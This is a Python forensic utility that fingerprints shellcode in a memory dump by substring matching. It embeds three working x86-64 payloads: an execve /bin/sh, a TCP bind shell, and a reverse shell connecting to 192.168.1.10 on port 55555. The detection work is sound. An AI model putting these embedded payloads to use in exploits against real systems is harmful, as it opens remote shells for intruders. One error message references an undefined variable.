#!/usr/bin/env python3

import argparse
import operator

# TODO: fingerprint unknown shellcode automagically 

# x84-64 execve /bin/sh
# http://shell-storm.org/shellcode/files/shellcode-806.php
a = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# x86-64 tcp bind shell port 55555 = 0xd903
# http://shell-storm.org/shellcode/files/shellcode-858.php
b = (
    b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
    b"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
    b"\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02"
    b"\x03\xd9\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05"
    b"\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31"
    b"\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59"
    b"\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48"
    b"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
    b"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
    b"\x5f\x6a\x3b\x58\x0f\x05"
)

# x86-64 tcp reverse shell ip 192.168.1.10 = 0x0a1080c0 port 55555 = 0xd903
# http://shell-storm.org/shellcode/files/shellcode-857.php
c = (
    b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
    b"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
    b"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
    b"\x02\x03\xd9\xc7\x44\x24\x04\xc0\x80\x10\x0a\x48\x89\xe6\x6a\x10"
    b"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
    b"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
    b"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
    b"\x5f\x6a\x3b\x58\x0f\x05"
)

shellcodes = {'execve_bin/sh': a, 'tcp_bind': b, 'tcp_reverse': c}

def chunk_gen(sample):
    length = len(sample)
    for i in range(length):
        for j in range(i + 2, length + 1):
            yield(sample[i:j]) 

def check_match(dump, shell):
    try:
        f = open(dump, 'rb')
    except FileNotFoundError as e:
        print(e)
        return
    sample = f.read()
    f.close()

    if shell not in shellcodes:
        print("No known sample of {} shellcode".format(e))
        return
   
    total = 0
    matched = 0 
    matches = []
    chunks = chunk_gen(shellcodes[shell])
    for c in chunks:
        total += 1
        if c in sample:
            matched += 1
            matches.append(c)
    matches = sorted(matches, key=len)[::-1]
    print("="*40)
    print("Matched {}% of sample in dump".format((matched/total)*100))
    print("-"*40)
    print("5 Longest matches were")
    print("-"*40)
    for i in range(5):
        print(matches[i])

def fingerprint(dump):
    try:
        f = open(dump, 'rb')
    except FileNotFoundError as e:
        print(e)
        return
    sample = f.read()
    f.close()

    guesses = {}
    for shell, guess in shellcodes.items():
        total = 0
        matched = 0
        chunks = chunk_gen(shellcodes[shell])
        for c in chunks:
            total += 1
            if c in sample:
                matched += 1
        guesses[shell] = (matched/total)*100
    guesses = sorted(guesses.items(), key=operator.itemgetter(1), reverse=True)
    print("="*40)
    print("Best matches are")
    print("-"*40)
    print("Shellcode  \t\t\t   Match")
    print("-"*40)
    for shell, match in guesses:
        print("{} \t\t{:>15.2f}%".format(shell, match))

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("dumpfile", help="What file has the memory dump?", type=str)
    parser.add_argument("shellcode", help="What shellcode to match?", type=str)
    args = parser.parse_args()
    check_match(args.dumpfile, args.shellcode)
    fingerprint(args.dumpfile)
